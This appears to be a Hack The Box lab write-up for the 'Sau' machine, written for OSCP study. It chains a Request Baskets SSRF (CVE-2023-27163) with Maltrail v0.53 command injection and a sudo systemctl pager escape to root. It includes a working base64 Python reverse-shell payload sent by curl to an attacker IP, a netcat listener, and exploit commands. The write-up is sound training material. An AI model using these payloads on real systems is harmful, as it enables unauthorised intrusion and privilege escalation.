# Sau — HTB (TJ Null OSCP List)

| Detail       | Value                          |
|--------------|--------------------------------|
| **IP**       | 10.129.229.26                  |
| **OS**       | Linux (Ubuntu 20.04 Focal)     |
| **Difficulty** | Easy                         |
| **Key Skills** | SSRF (CVE-2023-27163), Accessing filtered ports via SSRF, OS Command Injection (Maltrail v0.53 RCE), sudo systemctl + less pager escape |

---

## 1. Enumeration

### Nmap — Key Ports
```bash
sudo nmap -sC -sV -A -O -p- 10.129.229.26 -Pn --min-rate 1000
```
```
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
80/tcp    filtered http     ← NOT accessible from outside
8338/tcp  filtered unknown  ← NOT accessible from outside
55555/tcp open     http     Golang net/http server (Request Baskets)
```

### Key Observations
- **Port 80 and 8338 are FILTERED** — firewall blocks external access, but the box itself can reach them on localhost. This screams SSRF.
- **Port 55555** — redirects to `/web`, shows **Request Baskets** with version **1.2.1** disclosed in the footer
- **OpenSSH 8.2p1 Ubuntu 4ubuntu0.7** — maps to Ubuntu 20.04 (Focal)

### Web Enumeration (Port 55555)
```bash
# Directory brute force — nothing beyond /web
feroxbuster -u http://10.129.229.26:55555 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# Found: /web (200), /Web and /WEB (redirects), many 400s — nothing useful
```

The `/web` page allows creating "baskets" — endpoints that collect and inspect HTTP requests. The footer reveals: **request-baskets | Version: 1.2.1**

> **OSCP Technique — Version Disclosure:**
> Always check page footers, source comments, and response headers for version strings. Search `<software> <version> exploit` immediately.

---

## 2. SSRF — CVE-2023-27163 (Request Baskets 1.2.1)

### What Is SSRF?
Server-Side Request Forgery — you trick the server into making HTTP requests on your behalf. Here, Request Baskets lets you create a basket that **forwards** requests to any URL, including internal services on `127.0.0.1` that you can't reach directly.

### Why This Matters
Ports 80 and 8338 are **filtered** — the firewall blocks us. But the server can reach `127.0.0.1:80` from inside. The SSRF lets us tunnel through port 55555 to access the hidden service.

### Manual SSRF Setup (Understanding the Exploit)
1. Create a new basket on `/web`
2. In basket settings, configure forwarding:
   - **Forward URL:** `http://127.0.0.1:80`
   - **Proxy Response:** ✅ enabled (returns the forwarded response to us)
   - **Expand Forward Path:** ✅ enabled (appends our path to the forward URL)
   - **Insecure TLS:** ✅ enabled (if target uses self-signed certs)
3. Access the basket URL — you now see the internal service through the SSRF

### Automated Exploit
```bash
# Using the PoC script
./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80
```
```
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163)
> Creating the "njldyc" proxy basket...
> Basket created!
> Accessing http://10.129.229.26:55555/njldyc now makes the server request to http://127.0.0.1:80.
> Authorization: <token>
```

### Accessing the Internal Service
Browse to: `http://10.129.229.26:55555/njldyc`

This reveals: **Maltrail (v0.53)** — a malicious traffic detection system running on the internal port 80.

> **OSCP Technique — SSRF to Access Filtered Ports:**
> When nmap shows ports as "filtered", the service is running but firewalled from outside. If you find an SSRF, point it at `127.0.0.1:<filtered_port>` to access the hidden service. Common SSRF-capable apps: Request Baskets, SSRF-vulnerable webhooks, proxy configs, URL preview features.

> **OSCP Technique — Check Both Filtered Ports:**
> Port 8338 also returned Maltrail when tested via SSRF. Always enumerate ALL filtered ports through an SSRF — different ports may run different services.

---

## 3. Initial Access — Maltrail v0.53 RCE (OS Command Injection)

### The Vulnerability
Maltrail v0.53 has **unauthenticated OS command injection** in the `username` parameter of the `/login` page. The username is passed directly to a system command without sanitization.

### How the Injection Works
The login form sends:
```
POST /login
username=;<INJECTED_COMMAND>&password=anything
```
The server executes the username in a shell context. The payload is base64-encoded to avoid special character issues:
```
username=;`echo "<base64_payload>" | base64 -d | sh`
```

### The Exploit Chain (SSRF + RCE)

**Step 1 — Create an SSRF basket pointing to Maltrail's login page:**
```bash
./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80/login
```

**Step 2 — Start listener:**
```bash
nc -lnvp 9002
```

**Step 3 — Fire the RCE through the SSRF basket:**
```bash
python3 exploit.py 10.10.14.4 9002 http://10.129.229.26:55555/dwfcbe
```

### Manual Exploit (curl — no script needed)
```bash
# Generate the reverse shell payload
PAYLOAD=$(echo -n 'python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.4\",9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"' | base64 -w0)

# Send via curl through the SSRF basket
curl http://10.129.229.26:55555/dwfcbe --data "username=;\`echo+${PAYLOAD}+|+base64+-d+|+sh\`"
```

### Shell as puma
```
$ id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
```

### Upgrade Your Shell (Critical for Privesc!)
```bash
# On the target:
script /dev/null -c bash
# Press Ctrl+Z

# On Kali:
stty raw -echo; fg

# On the target (now back in):
reset
# Terminal type? screen
export TERM=xterm
```

> **OSCP Technique — Shell Upgrade Is Required Here:**
> The privesc depends on the `less` pager detecting your terminal size. A raw netcat shell has no TTY, so `less` won't activate and `!sh` won't work. You MUST upgrade to a proper TTY first.

### User Flag
```bash
cat ~/user.txt
```

---

## 4. Privilege Escalation — sudo systemctl + less Pager Escape

### Discover the Vector
```bash
sudo -l
```
```
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

### How the Exploit Works
1. `systemctl status` displays service information
2. When the output is longer than the terminal window, systemctl automatically pipes it through a **pager** (usually `less`)
3. `less` runs with the same privileges as the calling process — in this case, **root** (because of `sudo`)
4. Inside `less`, typing `!sh` spawns a shell — as root

### Exploitation
```bash
# Make your terminal small so the output overflows into the pager
# (the shell upgrade from Step 3 is critical — less needs a real TTY)

sudo /usr/bin/systemctl status trail.service
```

When `less` activates (you'll see `lines 1-XX` or `(END)` at the bottom, or `-- (press RETURN)`):
```
!sh
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
```

### Troubleshooting
If the pager doesn't activate:
```bash
# Shrink your terminal rows so output overflows
stty rows 10

# Then re-run
sudo /usr/bin/systemctl status trail.service
```

If you see `-- (press RETURN)` instead of a normal less prompt, just type `!sh` anyway — it still works.

> **OSCP Technique — Pager Escape (GTFOBins):**
> Any command that invokes a pager (`less`, `more`, `man`, `journalctl`, `systemctl status`) under sudo can be escaped with `!sh` or `!/bin/bash`. This works because the pager inherits root privileges. GTFOBins lists these: https://gtfobins.github.io/gtfobins/systemctl/

> **OSCP Technique — Terminal Size Matters:**
> The pager only activates when output exceeds terminal height. If privesc via pager escape "doesn't work", shrink your terminal with `stty rows 10` or resize the window. Also ensure you have a proper PTY (run `script /dev/null -c bash` first).

---

## 5. Attack Chain Summary

```
Nmap → Port 55555 open (Request Baskets 1.2.1)
         Port 80 FILTERED (can't reach directly)
    |
    +--> CVE-2023-27163 (SSRF)
    |        |
    |        +--> Create basket forwarding to http://127.0.0.1:80
    |                 |
    |                 +--> Reveals Maltrail v0.53 on filtered port
    |
    +--> Maltrail v0.53 RCE (OS Command Injection in username)
    |        |
    |        +--> SSRF basket → /login POST → base64 reverse shell
    |                 |
    |                 +--> Shell as puma → USER FLAG
    |
    +--> sudo -l → systemctl status (NOPASSWD)
             |
             +--> less pager escape → !sh
                      |
                      +--> ROOT FLAG
```

---

## 6. OSCP Exam Takeaways

### Techniques Demonstrated
1. **Filtered ports = internal services** — when nmap shows "filtered", the service exists but is firewalled. SSRF is the bypass.
2. **SSRF exploitation** — Request Baskets 1.2.1 lets you create forwarding proxies to internal addresses. Understand proxy_response and expand_path settings.
3. **Chaining vulnerabilities** — SSRF alone gives info; SSRF + RCE gives a shell. The SSRF basket must point to the vulnerable endpoint (`/login`), not just the root.
4. **OS command injection via POST parameters** — the `username` field was unsanitized. Base64-encoding payloads avoids special character issues.
5. **Shell upgrade is NOT optional** — the privesc literally fails without a proper PTY because `less` needs terminal dimensions.
6. **sudo pager escape** — `systemctl status`, `journalctl`, `man`, `less`, `more` under sudo all allow `!sh` to drop to a root shell. This is a GTFOBins classic.
7. **Terminal size manipulation** — `stty rows 10` forces the pager to activate when output would otherwise fit.

### Exam Patterns
- **"Filtered" ports on nmap are a red flag** — look for SSRF, LFI with SSRF (file:// or http://127.0.0.1), or proxy misconfigs to reach them
- **Version string → searchsploit/Google immediately** — both Request Baskets 1.2.1 and Maltrail 0.53 had public CVEs
- **CVE chaining is common on OSCP** — one CVE for access to internal service, second CVE for RCE on that service
- **Pager escapes show up on the exam** — memorize: `!sh` in `less`/`more`, `!/bin/bash` in `man`, same trick in `journalctl` and `systemctl`
- **Always upgrade your shell before attempting privesc** — `script /dev/null -c bash` → Ctrl+Z → `stty raw -echo; fg` → `reset`
